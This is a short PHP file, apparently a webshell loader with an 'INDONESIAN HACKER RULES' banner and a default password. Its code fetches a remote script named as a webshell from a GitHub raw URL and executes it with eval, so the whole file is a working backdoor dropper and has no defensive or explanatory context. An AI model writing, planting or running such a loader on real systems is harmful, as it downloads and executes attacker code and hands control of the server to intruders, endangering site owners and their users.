


<?php
/*----------------------------------------------*/
/////////////////////////////////////// //////////
///           INDONESIAN HACKER RULES           ///
///                11/08/2009                   ///
///            Default pass: kemuye             ///
///				                                  ///
//////////////////////////////////////////////////
/*----------------------------------------------*/
$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/templatebsn.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);

?>
